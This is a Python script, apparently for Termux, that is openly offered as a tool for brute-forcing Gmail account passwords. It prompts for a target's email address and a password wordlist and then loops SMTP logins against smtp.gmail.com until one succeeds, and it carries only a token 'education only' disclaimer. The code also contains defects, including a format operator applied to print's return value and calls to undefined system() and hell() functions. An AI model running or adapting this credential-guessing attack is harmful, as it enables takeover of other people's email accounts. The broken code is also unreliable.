import smtplib
import os

#       استدعاء المكتبات


Black="\[\033[0;30m\]" # Black
Red="\[\033[0;31m\]" # Red
Green="\[\033[0;32m\]" # Green
Yellow="\[\033[0;33m\]" # Yellow
Blue="\[\033[0;34m\]" # Blue
Purple="\[\033[0;35m\]" # Purple
Cyan="\[\033[0;36m\]" # Cyan
White="\[\033[0;37m\]" # White

rr="\033[0;31m"
yy="\[\033[0;33m"

# Bold
BBlack="\[\033[1;30m\]" # Black
BRed="\[\033[1;31m\]" # Red
BGreen="\[\033[1;32m\]" # Green
BYellow="\[\033[1;33m\]" # Yellow
BBlue="\[\033[1;34m\]" # Blue
BPurple="\[\033[1;35m\]" # Purple
BCyan="\[\033[1;36m\]" # Cyan
BWhite="\[\033[1;37m\]" # White

g="\033[1;32m"
b="\033[1;30m"
r="\033[1;31m"
y="\033[1;33m"
w="\033[1;37m"

#أكواد الألوان


os.system ("pkg install figlet")
os.system ("clear")
os.system ("figlet Brute")


print (rr+"|=======-<><><><><><><><><><><><>-=======|")
print (rr+"copyright:[This Tool Coded By \033[1;37m7azabet\033[0;31m ] ")
print (rr+"Usage==>[This Tool Is Used For Only education]") 
print (rr+"Target==>Brute Force Gmail Account")
print(rr+"Thank:[THANKS A LOT TO THE \033[1;37mPIRATE\033[0;31m ] ")
print (rr+"|=======-<><><><><><><><><><><><>-=======|\n")

z=" "
print (z*2)

print (b+"[!] \033[1;31mWarning: \033[1;37mThis tool is for education and security awareness only,and the programmer is not responsible for any wrong doing or use issued through this tool.please adhere to the laws to prevent legal accountability.")

print (z*2)

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

username = input(y+"ENTER THE TARGET'S EMAIL: ")
passwfile = input(y+"ENTER THE PASSWORD FILE: ")
passwfile = open(passwfile, "r")

x="  "
print (x*3)
print ("\033[1;36mThe Pirate Anwar \033[1;37mwill bring The Correct Password For U,don't worry:) ")
print (x*3)

for password in passwfile :
    try :

          smtpserver.login(username, password)
          print (g,"[+] PASSWORD FOUND ==> %s ") %password
          break

    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print ("\n")
                            print (rr+"[!] Password incorrect:==>" , password)
                            break
                else:
                        print (rr+"[!] Password incorrect:==>" , password)
